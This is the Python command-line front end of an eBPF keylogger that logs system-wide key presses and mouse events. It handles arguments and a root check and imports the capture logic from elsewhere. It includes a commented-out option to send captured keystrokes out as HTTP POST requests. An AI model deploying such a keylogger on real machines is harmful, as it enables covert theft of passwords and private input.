#  bpf_keylogger: Log key presses and mouse button events systemwide using eBPF
#  Copyright (C) 2019  William Findlay
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.

import os, sys
import argparse

from bpf_program import BPFProgram

DESCRIPTION="""
A keylogger written in eBPF.
By: William Findlay
"""

EPILOG="""
WARNING: This is intended for educational purposes only and should not be used maliciously.
"""

def main(args):
    bpf = BPFProgram(args)
    bpf.main()

def is_root():
    return os.geteuid() == 0

def parse_args(args=sys.argv[1:]):
    parser = argparse.ArgumentParser(prog="bpf-keylogger", description=DESCRIPTION,
            epilog=EPILOG, formatter_class=argparse.RawDescriptionHelpFormatter)

    # Debugging info
    parser.add_argument("--debug", action="store_true",
            help="Print debugging info.")
    # Timestamps
    parser.add_argument("-t", "--timestamp", action="store_true",
            help="Print time stamps.")

    # Options for handling output
    output_options = parser.add_mutually_exclusive_group()
    output_options.add_argument("-o", "--outfile", type=str,
            help="Output trace to a file instead of stdout.")
    #output_options.add_argument("--http", type=str,
    #        help="Send trace as http POST requests.")

    args = parser.parse_args(args)

    # Check UID
    if not is_root():
        parser.error("You must run this script with root privileges.")

    return args

if __name__ == "__main__":
    args = parse_args()
    main(args)
